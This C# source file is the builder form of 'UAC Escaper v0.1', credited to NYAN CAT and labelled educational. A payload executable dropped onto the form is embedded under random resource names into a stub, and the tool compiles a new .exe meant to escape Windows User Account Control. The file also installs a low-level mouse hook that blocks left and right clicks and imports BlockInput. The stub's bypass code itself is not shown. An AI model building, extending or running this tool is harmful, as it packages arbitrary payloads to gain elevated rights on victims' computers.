using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using UAC_Escaper.Build;

/* 
       │ Author       : NYAN CAT
       │ Name         : UAC Escaper v0.1
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

namespace UAC_Escaper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.AllowDrop = true;
            this.DragEnter += new DragEventHandler(Form1_DragEnter);
            this.DragDrop += new DragEventHandler(Form1_DragDrop);
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        // Importa as funções que serão usadas
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int code, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelMouseProc(int code, IntPtr wParam, IntPtr lParam);

        private enum MouseMessages
        {
            WM_LBUTTONDOWN = 0x0201,
            WM_LBUTTONUP = 0x0202,
            WM_MOUSEMOVE = 0x0200,
            WM_MOUSEWHEEL = 0x020A,
            WM_RBUTTONDOWN = 0x0204,
            WM_RBUTTONUP = 0x0205
        }

        const int WH_MOUSE_LL = 14; // Tipo de hook que será usado

        private LowLevelMouseProc hook = hookProc;
        private static IntPtr hhook = IntPtr.Zero;

        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_MOUSE_LL, hook, hInstance, 0); // Instala o hook para a interceptação dos eventos do mouse
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook); // Remove o hook instalado
        }

        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            // Se a mensagem recebida for > 0 e o clique do mouse for do botão esquerdo ou direito
            if (code >= 0 && MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam || MouseMessages.WM_RBUTTONDOWN == (MouseMessages)wParam)
            {
                return (IntPtr)1; // Inibe o clique
            }
            else
                return CallNextHookEx(hhook, code, (int)wParam, lParam); // Passa para o próximo evento
        }

        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            UnHook(); // Ao fechar o form desintalamos o hook
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        void Form1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }

        void Form1_DragDrop(object sender, DragEventArgs e)
        {
            try
            {
                string[] file = (string[])e.Data.GetData(DataFormats.FileDrop);
                SaveFileDialog saveFileDialog = new SaveFileDialog
                {
                    Filter = ".exe (*.exe)|*.exe",
                    InitialDirectory = Environment.CurrentDirectory,
                    OverwritePrompt = false,
                };
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    Builder builder = new Builder
                    {
                        PayloadPath = file[0],
                        PayloadResources = Path.GetRandomFileName().Replace(".", ""),
                        SaveFileName = saveFileDialog.FileName,
                        TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"),
                        ResourceManager = Path.GetRandomFileName().Replace(".", ""),
                        StubCs = Properties.Resources.Stub,
                    };
                    builder.Replacer("#exe", Path.GetExtension(builder.PayloadPath));
                    builder.Replacer("#payload", builder.PayloadResources);
                    builder.Replacer("#resource", builder.ResourceManager);
                    MessageBox.Show(this, new Compiler().Compile(builder));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

    }
}
